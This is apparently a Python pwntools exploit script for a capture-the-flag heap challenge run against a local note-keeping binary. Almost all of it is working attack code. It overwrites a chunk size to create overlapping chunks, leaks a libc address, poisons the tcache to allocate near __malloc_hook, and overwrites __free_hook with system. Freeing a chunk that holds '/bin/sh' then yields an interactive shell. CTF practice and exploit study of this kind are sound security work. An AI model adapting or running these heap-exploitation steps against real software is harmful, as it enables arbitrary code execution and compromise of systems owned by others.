import chunk
from pwn import *

elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')	

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *EditNote+295",
		"c"
	]))
elif args.REMOTE:
	p = remote("localhost", 9003)
else:
	p = process(elf.path) 


def c(idx, size, content):
	p.sendlineafter(b'Choice: ', b'1')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'Size: ', str(size).encode())
	p.sendlineafter(b'Content', content)


def e(idx, offset, content):
	count = 2147483647
	p.sendlineafter(b'Choice: ', b'2')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'Offset: ', str(offset).encode())
	p.sendlineafter(b'Count: ', str(count).encode())
	p.sendlineafter(b'Content', content)


def s(idx):
	p.sendlineafter(b'Choice: ', b'3')
	p.sendlineafter(b'Index: ', str(idx).encode())
	content = p.recvline()
	return content[len(b'Content: '):].strip(b'\n')

def d(idx):
	p.sendlineafter(b'Choice: ', b'4')
	p.sendlineafter(b'Index: ', str(idx).encode())


INT32_MAX = 2147483647
INT32_MIN = -2147483648

chunk_size = 0x70

for i in range(7):
	c(0, chunk_size-0x8, chr(ord('A') + i).encode() * 0x10)
	d(0)


c(1, chunk_size - 0x8, b'nadpisywacz kuba')
c(2, chunk_size - 0x8, b'TEST')
c(3, 0x440, b'Z' * 0x40)
c(0, chunk_size - 0x8, b'splitter')

e(1, chunk_size-8, p64(chunk_size + 1 + 0x440 + 0x10))
d(2)

c(2,  chunk_size-8, b'DUPA')

libc_leak = s(3)[:8]
libc_leak = u64(libc_leak)
print(f"[+] libc leak {hex(libc_leak)}")
libc_base = libc_leak - 0x1ebbe0
print(f"[+] libc base {hex(libc_base)}")

libc.address = libc_base
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
system = libc.symbols['system']
print(f"[+] free_hook {hex(free_hook)}")
print(f"[+] malloc_hook {hex(malloc_hook)}")
print(f"[+] system {hex(system)}")

before_malloc_hook = malloc_hook-0xb
d(0)
d(2)
print(f"[+] Allocating unaligned at: {hex(before_malloc_hook)}")
e(1, chunk_size, p64(before_malloc_hook))

c(0, chunk_size-8, b'/bin/sh')
c(2, chunk_size-8, p64(0))

free_hook_offset = free_hook - before_malloc_hook
print(f"[+] free_hook_offset {hex(free_hook_offset)}")
e(2, free_hook_offset - 0x10, p64(system))

d(0)

p.interactive()
